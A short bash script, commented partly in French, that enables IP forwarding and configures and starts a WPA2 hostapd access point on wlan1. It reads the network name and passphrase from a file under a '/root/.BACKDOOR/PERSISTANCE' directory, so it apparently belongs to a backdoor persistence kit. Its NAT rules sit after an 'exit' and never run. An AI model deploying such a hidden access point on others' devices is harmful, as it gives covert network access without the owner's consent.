#!/bin/bash
clear
sudo sysctl net.ipv4.ip_forward=1

ssid=$(cat /root/.BACKDOOR/PERSISTANCE/CONFIG.txt | cut -d ':' -f 2)
password=$(cat /root/.BACKDOOR/PERSISTANCE/CONFIG.txt | cut -d ':' -f 3)

# CONFIGURATION DU POINT D'ACCES WLAN
echo "
# This is the name of the WiFi interface we configured above
interface=wlan1

# Use the nl80211 driver with the brcmfmac driver
driver=nl80211

# This is the name of the network
ssid=$ssid

# Use the 2.4GHz band
hw_mode=g

# Use channel 6
channel=6

# Enable 802.11n
ieee80211n=1

# Enable WMM
wmm_enabled=1

# Enable 40MHz channels with 20ns guard interval
ht_capab=[HT40][SHORT-GI-20][DSSS_CCK-40]

# Accept all MAC addresses
macaddr_acl=0

# Use WPA authentication
auth_algs=1

# Require clients to know the network name
ignore_broadcast_ssid=0

# Use WPA2
wpa=2

# Use a pre-shared key
wpa_key_mgmt=WPA-PSK

# The network passphrase
wpa_passphrase=$password

# Use AES, instead of TKIP
rsn_pairwise=CCMP

"> /etc/hostapd.conf


#STARTING AP
sudo systemctl force-reload hostapd

exit

# FORWARDING NETWORK
iptables --flush
sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i wlan1 -o wlan0 -j ACCEPT

